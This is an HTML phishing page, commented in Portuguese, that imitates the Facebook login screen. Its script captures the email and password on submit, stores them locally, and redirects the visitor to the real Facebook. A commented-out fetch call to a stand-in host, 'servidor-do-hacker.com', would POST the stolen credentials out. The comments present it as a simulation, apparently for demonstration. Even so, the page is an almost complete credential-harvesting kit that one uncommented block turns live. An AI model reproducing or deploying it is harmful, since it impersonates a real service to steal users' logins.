<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    #login-container {
      background-color: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
      width: 320px;
      text-align: center;
    }

    h1 {
      color: #1877f2;
      font-size: 32px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 4px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
    }

    a {
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div id="login-container">
    <h1>Facebook</h1>
    <form id="loginForm">
      <input type="text" id="email" placeholder="Email ou telefone" required>
      <input type="password" id="senha" placeholder="Senha" required>
      <button type="submit">Entrar</button>
    </form>
    <p><a href="https://www.facebook.com/recover">Esqueceu a senha?</a></p>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(event) {
      event.preventDefault(); // Impede o envio normal do formulário

      // Captura os dados inseridos
      var email = document.getElementById("email").value;
      var senha = document.getElementById("senha").value;

      // Aqui, o hacker pode enviar os dados para o seu servidor, usando uma requisição AJAX ou redirecionando para um link malicioso
      // Exemplo de armazenamento local (não recomendado e sem uso real)
      localStorage.setItem("email", email);
      localStorage.setItem("senha", senha);

      // Envia os dados para o servidor do hacker (simulação)
      var dados = "email=" + encodeURIComponent(email) + "&senha=" + encodeURIComponent(senha);

      // Exemplo de redirecionamento após captura dos dados
      window.location.href = "https://www.facebook.com"; // Redireciona para o Facebook após captura

      // Em uma aplicação real de phishing, o hacker enviaria os dados para um servidor controlado por ele
      // fetch("https://servidor-do-hacker.com/receber_dados", {
      //   method: "POST",
      //   body: dados,
      //   headers: {
      //     "Content-Type": "application/x-www-form-urlencoded"
      //   }
      // });

    });
  </script>
</body>
</html>
